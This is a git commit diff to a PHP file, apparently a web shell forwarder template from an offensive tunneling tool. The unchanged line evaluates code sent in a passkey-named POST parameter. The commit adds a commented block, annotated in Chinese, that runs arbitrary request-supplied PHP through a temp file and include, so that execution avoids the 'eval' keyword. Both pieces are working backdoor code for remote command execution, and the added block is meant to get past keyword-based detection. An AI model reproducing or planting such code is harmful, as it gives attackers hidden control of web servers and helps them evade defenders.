d329b8c19780ae0893881da27c3f40637a76c902
Nan3r <nan3r@foxmail.com>
2019-12-21 18:23:45 +0800

    add replace eval keyword method

--- data/tunnel/forwarders/post.php
+++ data/tunnel/forwarders/post.php
@@ -1,5 +1,18 @@
 <?
-
+/*
+1.替代eval 关键字的方式之一
+<?php
+function update($phpCode) {
+    $tmpfname = tempnam("/tmp", "update");
+    $handle = fopen($tmpfname, "w+");
+    fwrite($handle, "<?php\n" . $phpCode);
+    fclose($handle);
+    include $tmpfname;
+    unlink($tmpfname);
+    return get_defined_vars();
+}
+extract(update($_REQUEST["c"]));
+*/
 $x=$_POST['%%PASSKEY%%'];eval(%s);
 
 ?>
